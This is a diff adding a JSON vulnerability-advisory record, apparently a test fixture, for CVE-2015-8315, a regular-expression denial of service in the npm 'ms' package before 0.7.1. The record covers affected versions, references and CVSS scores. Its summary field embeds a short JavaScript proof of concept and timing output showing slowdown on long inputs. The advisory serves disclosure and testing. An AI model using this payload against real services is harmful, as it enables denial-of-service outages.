@@ -1,0 +1,128 @@
+{
+  "aliases": [
+    "CVE-2015-8315",
+    "GHSA-3fx5-fwvr-xrjg"
+  ],
+  "summary": "Regular Expression Denial of Service in ms\nVersions of `ms` prior to 0.7.1 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.\n\n## Proof of Concept\n```javascript\nvar ms = require('ms');\nvar genstr = function (len, chr) {\n   var result = \"\";\n   for (i=0; i<=len; i++) {\n       result = result + chr;\n   }\n\n   return result;\n}\n\nms(genstr(process.argv[2], \"5\") + \" minutea\");\n\n```\n\n### Results\nShowing increase in execution time based on the input string.\n```\n$ time node ms.js 10000\n\nreal\t0m0.758s\nuser\t0m0.724s\nsys\t0m0.031s\n\n$ time node ms.js 20000\n\nreal\t0m2.580s\nuser\t0m2.494s\nsys\t0m0.047s\n\n$ time node ms.js 30000\n\nreal\t0m5.747s\nuser\t0m5.483s\nsys\t0m0.080s\n\n$ time node ms.js 80000\n\nreal\t0m41.022s\nuser\t0m38.894s\nsys\t0m0.529s\n```",
+  "affected_packages": [
+    {
+      "package": {
+        "type": "npm",
+        "namespace": null,
+        "name": "ms",
+        "version": null,
+        "qualifiers": null,
+        "subpath": null
+      },
+      "affected_version_range": null,
+      "fixed_version": "0.7.1"
+    }
+  ],
+  "references": [
+    {
+      "reference_id": "",
+      "reference_type": "",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8315",
+      "severities": [
+        {
+          "system": "cvssv3.1",
+          "value": "7.5",
+          "scoring_elements": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "system": "generic_textual",
+          "value": "HIGH",
+          "scoring_elements": ""
+        }
+      ]
+    },
+    {
+      "reference_id": "",
+      "reference_type": "",
+      "url": "https://github.com/unshiftio/millisecond/",
+      "severities": [
+        {
+          "system": "cvssv3.1",
+          "value": "7.5",
+          "scoring_elements": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "system": "generic_textual",
+          "value": "HIGH",
+          "scoring_elements": ""
+        }
+      ]
+    },
+    {
+      "reference_id": "",
+      "reference_type": "",
+      "url": "https://support.f5.com/csp/article/K46337613?utm_source=f5support&amp;utm_medium=RSS",
+      "severities": [
+        {
+          "system": "cvssv3.1",
+          "value": "7.5",
+          "scoring_elements": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "system": "generic_textual",
+          "value": "HIGH",
+          "scoring_elements": ""
+        }
+      ]
+    },
+    {
+      "reference_id": "",
+      "reference_type": "",
+      "url": "https://www.npmjs.com/advisories/46",
+      "severities": [
+        {
+          "system": "cvssv3.1",
+          "value": "7.5",
+          "scoring_elements": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "system": "generic_textual",
+          "value": "HIGH",
+          "scoring_elements": ""
+        }
+      ]
+    },
+    {
+      "reference_id": "",
+      "reference_type": "",
+      "url": "http://www.openwall.com/lists/oss-security/2016/04/20/11",
+      "severities": [
+        {
+          "system": "cvssv3.1",
+          "value": "7.5",
+          "scoring_elements": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "system": "generic_textual",
+          "value": "HIGH",
+          "scoring_elements": ""
+        }
+      ]
+    },
+    {
+      "reference_id": "",
+      "reference_type": "",
+      "url": "http://www.securityfocus.com/bid/96389",
+      "severities": [
+        {
+          "system": "cvssv3.1",
+          "value": "7.5",
+          "scoring_elements": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "system": "generic_textual",
+          "value": "HIGH",
+          "scoring_elements": ""
+        }
+      ]
+    }
+  ],
+  "date_published": "2017-10-24T18:33:36+00:00",
+  "weaknesses": [400],
+  "url": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/github_osv_test_1.json"
+}
